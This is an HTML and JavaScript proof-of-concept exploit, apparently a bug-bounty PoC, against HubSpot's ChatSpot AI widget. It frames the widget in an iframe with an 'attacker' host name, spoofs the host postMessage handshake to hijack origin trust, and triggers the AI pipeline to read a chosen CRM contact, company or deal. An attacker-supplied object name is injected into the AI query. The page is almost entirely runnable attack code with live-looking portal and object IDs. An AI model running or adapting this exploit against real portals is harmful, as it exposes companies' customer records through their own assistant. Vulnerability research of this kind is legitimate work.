 <html>
  <head>
    <meta charset="utf-8">
    <title>HubSpot ChatSpot PoC</title>
    <style>
      body { font-family: monospace; padding: 20px; background: #111; color:
   #eee; }
      input, select { background: #222; color: #eee; border: 1px solid #444;
   padding: 4px 8px; width: 100%; box-sizing: border-box; font-family:
  monospace; font-size: 13px; }
      label { display: block; margin-top: 10px; font-size: 12px; color:
  #aaa; }
      button { margin-top: 12px; margin-right: 6px; padding: 6px 14px;
  cursor: pointer; background: #333; color: #eee; border: 1px solid #555;
  font-family: monospace; }
      button:hover { background: #444; }
      #log { margin-top: 14px; background: #000; border: 1px solid #333;
  padding: 10px; height: 220px; overflow-y: auto; font-size: 12px; }
      .ok   { color: #0f0; }
      .err  { color: #f44; }
      .inf  { color: #48f; }
      .warn { color: #fa0; }
      hr { border-color: #333; margin: 14px 0; }
    </style>
  </head>
  <body>

  <b>HubSpot — Cross-Origin AI Pipeline Hijack</b>
  <hr>

  <label>Portal ID</label>
  <input id="portalId" value="146256700">

  <label>Object ID</label>
  <input id="objectId" value="739644991696">

  <label>Object Type</label>
  <select id="objectTypeId">
    <option value="0-1">0-1 — Contact</option>
    <option value="0-2">0-2 — Company</option>
    <option value="0-3">0-3 — Deal</option>
  </select>

  <label>Object Name <span style="color:#666">(injected into AI
  query)</span></label>
  <input id="objectName" value="Figma Elastic">

  <br>
  <button onclick="launch()">▶ Launch (auto-fires)</button>
  <button onclick="reset()">Reset</button>
  <button onclick="clearLog()">Clear log</button>

  <div id="log"></div>

  <script>
  let iframeEl = null;
  let chatspotId = null;

  function log(label, msg, cls) {
    const d = document.getElementById('log');
    const line = document.createElement('div');
    line.className = cls || 'inf';
    const ts = new Date().toISOString().slice(11, 23);
    line.textContent = '[' + ts + '] [' + label + '] ' + (typeof msg ===
  'object' ? JSON.stringify(msg) : msg);
    d.appendChild(line);
    d.scrollTop = d.scrollHeight;
  }

  function clearLog() { document.getElementById('log').innerHTML = ''; }

  function reset() {
    if (window._hsPoC) window.removeEventListener('message', window._hsPoC);
    if (iframeEl) iframeEl.remove();
    iframeEl = null;
    chatspotId = null;
    log('RESET', 'cleared', 'warn');
  }

  function launch() {
    reset();

    const portalId = document.getElementById('portalId').value;
    const objectId = document.getElementById('objectId').value;
    const objectTypeId = document.getElementById('objectTypeId').value;
    const objectTypeLabel = objectTypeId === '0-1' ? 'Contact' :
  objectTypeId === '0-2' ? 'Company' : 'Deal';
    const objectName = document.getElementById('objectName').value;
    const freshThread = crypto.randomUUID();

    const ACTION = encodeURIComponent(JSON.stringify({
      intent: 'object_summary',
      objectId,
      objectTypeId,
      objectTypeLabel,
      objectName,
      label: objectTypeLabel,
      summaryType: 'STANDARD'
    }));

    const src = 'https://app-eu1.hubspot.com/chatspot-widget-ui/' + portalId
   + '/chat'
      + '?hostAppName=attacker'
      + '&copilotThreadId=' + freshThread
      + '&copilotAction=' + ACTION;

    log('LAUNCH', 'thread=' + freshThread, 'inf');

    iframeEl = document.createElement('iframe');
    iframeEl.src = src;
    iframeEl.style.cssText = 'position:fixed;top:0;right:0;width:450px;height:100vh;border:none;z-index:9999';
    document.body.appendChild(iframeEl);

    window._hsPoC = function(e) {
      if (e.origin !== 'https://app-eu1.hubspot.com') return;
      let d;
      try { d = typeof e.data === 'string' ? JSON.parse(e.data) : e.data; }
  catch(_) { return; }
      if (!d || !d.payload) return;

      const type = d.payload.type;

      if (type === 'SYNC_ACK') {
        chatspotId = d.from;
        log('HIJACKED', 'origin trust stolen — id=' + chatspotId, 'ok');
      }

      if (type === 'READY') {
        log('READY', 'sending SET_COMPONENT_STATE', 'ok');
        iframeEl.contentWindow.postMessage({
          id: crypto.randomUUID(), format: '__hs-ifr', from: 'HOST', to:
  chatspotId, v: 1,
          payload: {
            type: 'SET_COMPONENT_STATE',
            updates: { isOpen: true, isReady: true, isLoaded: true,
  isDisabled: false, isFullscreenMode: false },
            target: 'nav-components:chatspot-sidebar'
          }
        }, '*');
      }

      if (type === 'INVOKE_CAPABILITY'
        && d.payload.name === 'UPDATE_QUERY_PARAM_CAP'
        && d.payload.args?.key === 'copilotAction'
        && d.payload.args?.value === '') {
        log('AI FIRED', 'pipeline triggered — AI reading CRM object ' +
  objectId, 'ok');
      }

      if (type === 'INVOKE_CAPABILITY') {
        log('CAP', d.payload.name, 'inf');
      }
    };
    window.addEventListener('message', window._hsPoC);

    iframeEl.addEventListener('load', () => {
      setTimeout(() => {
        const embedId = crypto.randomUUID();
        iframeEl.contentWindow.postMessage({
          id: crypto.randomUUID(), format: '__hs-ifr', from: 'HOST', to:
  embedId, v: 1,
          payload: { type: 'SYNC', embedId, group: 'iframeable', name:
  'embed', appData: {}, embeddedProps: {} }
        }, '*');
        log('SYNC', 'handshake sent', 'inf');
      }, 1000);
    });
  }
  </script>

  </body>
  </html>
